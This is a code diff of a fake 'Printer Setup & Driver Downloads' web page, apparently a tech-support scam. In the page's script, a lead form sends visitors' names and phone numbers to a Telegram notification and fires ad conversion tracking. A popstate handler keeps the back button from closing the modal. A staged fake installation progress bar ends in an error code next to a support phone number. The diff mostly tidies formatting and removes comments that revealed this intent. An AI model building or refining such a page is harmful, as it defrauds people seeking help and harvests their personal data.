@@ -1,15 +1,16 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17870679276"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17870679276"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
 
-  gtag('config', 'AW-17870679276');
-</script>
+    gtag('config', 'AW-17870679276');
+  </script>
+
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Printer Setup & Driver Downloads</title>
@@ -34,6 +35,7 @@
     }
 
     .font-mono { font-family: ui-monospace, SFMono-Regular, Consolas, monospace; }
+    .font-sans { font-family: ui-sans-serif, system-ui, sans-serif; }
     .max-w-7xl { max-width: 80rem; margin: 0 auto; width: 100%; }
     .max-w-6xl { max-width: 75rem; margin: 0 auto; width: 100%; }
     .max-w-3xl { max-width: 48rem; margin: 0 auto; width: 100%; }
@@ -297,7 +299,7 @@
     .connection-action-btn { background-color: #2563eb; color: #ffffff; font-size: 0.875rem; font-weight: 700; padding: 0.75rem 1.25rem; border-radius: 0.5rem; border: none; cursor: pointer; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05); transition: background-color 0.2s; }
     .connection-action-btn:hover { background-color: #1d4ed8; }
 
-    /* 🌟 HESITATION-FREE USER LEAD FORM POPUP STYLES 🌟 */
+    /* LEAD FORM POPUP STYLES */
     .lead-form-box { display: flex; flex-direction: column; gap: 1rem; width: 100%; }
     .lead-field-group { display: flex; flex-direction: column; gap: 0.35rem; }
     .lead-label { font-size: 0.875rem; font-weight: 700; color: #1f2937; }
@@ -329,6 +331,11 @@
     .err-badge-tag { font-size: 10px; color: #6b7280; text-transform: uppercase; letter-spacing: 0.05em; font-weight: 700; margin-bottom: 0.125rem; }
     .err-code-txt { font-size: 1.25rem; font-weight: 700; color: #dc2626; }
     .err-s2-img { width: auto; height: 26vh; max-height: 15rem; min-height: 150px; object-fit: contain; }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: .5; }
+    }
   </style>
 </head>
 <body>
@@ -341,7 +348,7 @@
 
       <div class="nav-contact-center font-sans">
         <i data-lucide="phone" class="shake-icon" style="width: 20px; height: 20px;"></i>
-        <span>612-314-9536</span>
+        <a href="tel:6123149536" style="text-decoration: none; color: inherit;">612-314-9536</a>
       </div>
 
       <nav id="navbar-links"></nav>
@@ -526,7 +533,7 @@
   // Google Ads Event snippet for Page view conversion page function integration
   function gtag_report_conversion(url) {
     var callback = function () {
-      if (typeof(url) != 'undefined') {
+      if (typeof(url) !== 'undefined' && url !== null) {
         window.location = url;
       }
     };
@@ -535,6 +542,10 @@
           'send_to': 'AW-17870679276/unoQCKr2qLwcEOzZs8lC',
           'event_callback': callback
       });
+    } else {
+      if (typeof(url) !== 'undefined' && url !== null) {
+        window.location = url;
+      }
     }
     return false;
   }
@@ -609,7 +620,6 @@
     if (step === 'select') {
       document.getElementById('step-select-instruction').textContent = mainModelVal ? `Select your connection type for ${brandWord} ${mainModelVal}:` : `Select your connection type:`;
     } else if (step === 'form') {
-      // Pre-fill model input in modal form if user typed it on main card
       const modalModelField = document.getElementById('userModelInput');
       if (modalModelField && mainModelVal) {
         modalModelField.value = mainModelVal;
@@ -622,11 +632,9 @@
     document.getElementById('setupModal').style.display = 'flex'; 
     setModalStep('select'); 
     
-    // Push browser state so user cannot close by pressing back button
     history.pushState({ modalState: 'active' }, '');
   }
   
-  // FORCE CLOSE ONLY WHEN USER CLICKS CROSS (X) ICON
   function forceCloseModal() {
     if (progressIntervalTimer) clearInterval(progressIntervalTimer);
     if (executionTimeoutTimer) clearTimeout(executionTimeoutTimer);
@@ -644,7 +652,6 @@
     isModalOpen = false;
   }
 
-  // Prevent back-button closing modal or error state
   window.addEventListener('popstate', function (event) {
     if (isModalOpen) {
       history.pushState({ modalState: 'active' }, '');
@@ -654,13 +661,11 @@
   function handleMainFormSubmit(e) { e.preventDefault(); openSetupModal(); }
   function updateProgressBarWidth(p) { document.getElementById('progress-percentage-txt').textContent = `${p}%`; document.getElementById('progress-bar-fill').style.width = `${p}%`; }
 
-  // 1. SELECT CONNECTION TYPE -> OPEN POPUP LEAD FORM
   function selectConnectionType(type) {
     connectionType = type;
     setModalStep('form');
   }
 
-  // 2. LEAD FORM SUBMIT -> SEND TELEGRAM + TRIGGER CONVERSION + PROGRESS
   async function handleLeadFormSubmit(e) {
     e.preventDefault();
 
@@ -669,10 +674,10 @@
     const phone = document.getElementById('userPhoneInput').value.trim();
     const brandWord = brandConfigs[detectedBrand]?.shortWord || 'CA';
 
-    // A. Trigger Google Ads Conversion Tracking (AW-17870679276/unoQCKr2qLwcEOzZs8lC)
+    // A. Trigger Google Ads Conversion Tracking
     gtag_report_conversion();
 
-    // B. Send Telegram Notification with full lead data
+    // B. Send Telegram Notification
     const payload = `🖨️ <b>New Driver Setup Form Received</b>
 
 👤 <b>Full Name:</b> ${escapeHTML(name)}
@@ -695,7 +700,7 @@
         console.error("Telegram Transmission Error:", err);
     }
 
-    // C. Transition to Progress Animation and eventually Error Code Step
+    // C. Transition to Progress Animation and Error Code Step
     document.getElementById("installing-msg").textContent =
         installingMessages[Math.floor(Math.random() * installingMessages.length)];
 
